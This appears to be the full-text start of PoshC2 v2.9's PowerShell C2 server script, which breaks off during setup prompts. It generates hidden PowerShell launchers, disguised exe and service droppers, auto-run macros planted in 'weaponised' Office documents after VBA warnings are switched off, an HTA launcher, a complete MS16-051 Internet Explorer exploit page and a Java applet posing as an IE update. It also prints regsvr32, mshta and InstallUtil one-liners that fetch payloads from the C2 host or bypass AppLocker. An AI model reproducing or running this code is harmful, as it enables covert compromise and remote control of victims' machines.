# Written by @benpturner and @davehardy20
function C2-Server {
Param($PoshPath, $RestartC2Server)

# are we running with Administrator privileges to open port 80
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
{   
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process -FilePath powershell -Verb runAs -ArgumentList $arguments
    Break
}

Clear-Host
Write-Host -Object ""
Write-Host -Object "__________            .__.     _________  ________  "  -ForegroundColor Green
Write-Host -Object "\_______  \____  _____|  |__   \_   ___ \ \_____  \ "  -ForegroundColor Green
Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -ForegroundColor Green
Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
Write-Host "=============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
Write-Host "====================================================" `n -ForegroundColor Green

if (!$RestartC2Server) {
    $PathExists = Test-Path $PoshPath

    if (!$PathExists) {
        $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
    }
}

# if poshpath ends with slash then remove this

# tests for java JDK so we can create a Jar payload and applet
if (Test-Path "C:\program files\java\") {
    foreach ($folder in (get-childitem -name -path "C:\program files\java\"))
    {
        if ($folder.ToString().ToLower().StartsWith("jdk"))
        {
            $JDKPath = "C:\program files\java\$folder"
        }
    }
} else {
    Write-host "Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads" -ForegroundColor Red
}

$p = $env:PsModulePath
$p += ";$PoshPath"
[Environment]::SetEnvironmentVariable("PSModulePath",$p)
Import-Module -Name PSSQLite
$global:newdir = $null
$ipv4address = $null
$randomuriarray = @()
$taskiddb = 1 

# used to generate random uri for each implant
function Get-RandomURI 
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted bytes block 
function Encrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
function Decrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# download file function to convert from base64 in db to file
function Download-File
{
    param
    (
        [string] $SourceFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
    $reader = [System.IO.File]::OpenRead($SourceFilePath)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $base64
    $reader.Dispose()
}

# converts a source base64 file to file (need to change to IO.Memory Reader)
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath
    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize
    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);
     
    $reader.Dispose()
    $writer.Dispose()
}

# for resolving paths for file downloader
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

# create bat payloads
function CreatePayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)

    Write-Host -Object "Batch Payload written to: $global:newdir\payloads\payload.bat"  -ForegroundColor Green
}

# create exe 
function CreateStandAloneExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}


# create service exe 
function CreateServiceExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$cscservicecode = 'using System;
using System.Text;
using System.ServiceProcess;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Service
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
    public partial class Service1 : ServiceBase
    {
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch (ArgumentException e)
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
        }

        protected override void OnStop()
        {
        }
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh-service.cs", $cscservicecode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}

# create macro payloads
function CreateMacroPayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadbits = $null
    While ($payload)
    { 
        $y = $payload[0..500] -join ''
        $payload = $payload -replace $y,''
        $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`r`n"
    }

    $macro = 'Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec, wsh

str = ""
'+$payloadbits+'
exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
'

$macrodoc = $macro + '
Shell(exec)
End Sub'

$wscript = $macro + '
Set wsh = CreateObject( "WScript.Shell" )
wsh.Exec(exec)
End Sub

UpdateMacro'

    [IO.File]::WriteAllLines("$global:newdir\payloads\macro.txt", $macrodoc)
    [IO.File]::WriteAllLines("$global:newdir\payloads\wscript.vbs", $wscript)
    try {
    Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
    Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
    Write-Host -Object "Exe Payload written to: $global:newdir\payloads\posh.exe"  -ForegroundColor Green
    Write-Host -Object "Service-Exe Payload written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green

    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $ExcelApp = New-Object -ComObject "Excel.Application"
    $ExcelVersion = $ExcelApp.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $ExcelApp.DisplayAlerts = $false
    $ExcelApp.DisplayAlerts = "wdAlertsNone"
    $ExcelApp.Visible = $false
    $ExcelWorkbook = $ExcelApp.Workbooks.Add(1)
    $ExcelWorksheet = $ExcelWorkbook.Worksheets.Item(1)
    $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
    $ExcelVBA.CodeModule.AddFromString($macrodoc)
    $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
    $ExcelApp.Workbooks.Close()
    $ExcelApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Word
    $WordApp = New-Object -ComObject "Word.Application"
    $WordVersion = $WordApp.Version
    
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    
    $WordApp.Visible = $false
    $WordPage = $WordApp.Documents.Add()
    $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
    $WordVBA.CodeModule.AddFromString($macrodoc)
    $WordPage.SaveAs([ref]"$global:newdir\payloads\WordMacro", [ref][Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
    $WordApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
    $PPTApp = New-Object -ComObject "Powerpoint.Application"
    $PPTVersion = $PPTApp.Version
    $notvisible = [microsoft.office.core.msotristate]::msoFalse

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
    $BlankLayout = $SlideType::ppLayoutTitleOnly

    $PPTPage = $PPTApp.Presentations.Add([microsoft.office.core.msotristate]::msoFalse)
    $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
    $PPTVBA.CodeModule.AddFromString($macrodoc)
    $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
    $PPTPage.Close()
    $PPTApp.Quit()
    Stop-Process -name "POWERPNT"

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings | Out-Null
    }
    catch{
    
    }
}

# create HTA payload
function CreateHTAPayload
{

    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    
    #HTA index file generation
    # output simple html for loading HTA. This could be used with any cloned web page.
    # host this HTML and Launcher.HTA on a web server.
    # HTA Payload taken from https://github.com/trustedsec/unicorn , minus the obfuscation
    $HTMLCode = '<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>'
    $HTMLFile = "$global:newdir\payloads\index.html"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile

    #HTA Payload file generation
    $HTMLCode = @"
    <script>
    ao=new ActiveXObject("WScript.Shell");
    ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c powershell $payloadraw', 0);window.close();
    </script>
"@
    $HTMLFile = "$global:newdir\payloads\Launcher.hta"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
    Write-Host -Object "HTA Payload written to: $global:newdir\index.html and Launcher.hta"  -ForegroundColor Green
}

# create MS16-051 payload
function Create-MS16-051-Payload
{
    $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $htmlpayload = $poshexec+'"'+','+$payload

  $html = @"
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "$htmlpayload"
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
"@

  [IO.File]::WriteAllLines("$global:newdir\payloads\ms16-051.html", $html)
  Write-Host -Object "MS16-051 payload, use this via a web server: $global:newdir\payloads\ms16-051.html"  -ForegroundColor Green
}
# taken from nishang Out-Java
function CreateJavaPayload
{
$OutputPath="$pwd"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$payloadraw = [Convert]::ToBase64String($bytes)

# Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
$JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@

# compile the Java file
$JavaFile = "$OutputPath\JavaPS.java"
Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile

$JavacPath = "$JDKPath" + "\bin\javac.exe"
& "$JavacPath" "$JavaFile"

# create a manifest for JAR, taken from SET
$Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@

$ManifestFile = "$OutputPath\manifest.txt"
Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

# create the JAR
$Jarpath = "$JDKPath" + "\bin\jar.exe"
& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
   
# output simple html. This could be used with any cloned web page.
# host this HTML and SignedJarPS.jar on a web server.
$HTMLCode = @'
<div> 
<object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
</object></div>
<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
'@
$HTMLFile = "$global:newdir\payloads\applet.html"
Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

# cleanup
Remove-Item "$OutputPath\JavaPS*"
  
# cleanup to remove temporary files
Remove-Item "$OutputPath\manifest.txt"
Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and applet.html"  -ForegroundColor Green
}

# if the server has been restarted using the Restart-C2Server shortcut
if ($RestartC2Server) 
{
    $global:newdir = $RestartC2Server
    $payload = Get-Content "$global:newdir\payloads\payload.bat"
    Write-Host -Object "Using existing database and payloads: $global:newdir"
    $Database = "$global:newdir\PowershellC2.SQLite"
    $taskscompleted = Invoke-SqliteQuery -DataSource $Database -Query "SELECT CompletedTaskID FROM CompletedTasks" -As SingleValue

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $ipv4address = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $serverport = $c2serverresults.ServerPort 
    $shortcut = $c2serverresults.QuickCommand
    $downloaduri = $c2serverresults.DownloadURI
    $httpresponse = $c2serverresults.HTTPResponse
    $enablesound = $c2serverresults.Sounds

    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"
    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""


    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"

    foreach ($task in $taskscompleted) {
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
    $ranuri = $resultsdb.RandomURI
    $implanthost = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
    if ($resultsdb)
    {
        if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
        elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
        else 
        {
            Write-Host "Command Issued @" $resultsdb.TaskID "Against Host" $implanthost -ForegroundColor Green
            Write-Host -Object $resultsdb.Command -ForegroundColor Red
            Write-Host -Object $resultsdb.Output
        }
        $taskiddb ++
    }
    }
    $newcount = $taskscompleted.Count
    $taskiddb = $newcount+1
    write-host "$newcount tasks completed before resuming the C2 server"
}
else 
{
    # determine if there are multiple network adaptors
    $localipfull = Get-WmiObject -Query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" |
    Select-Object -ExpandProperty IPAddress | 
    Where-Object -FilterScript {([Net.IPAddress]$_).AddressFamily -eq 'InterNetwork'}
    if ($localipfull)
    {
        Write-Output -InputObject "IP found: $localipfull"
        write-host ""
        $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
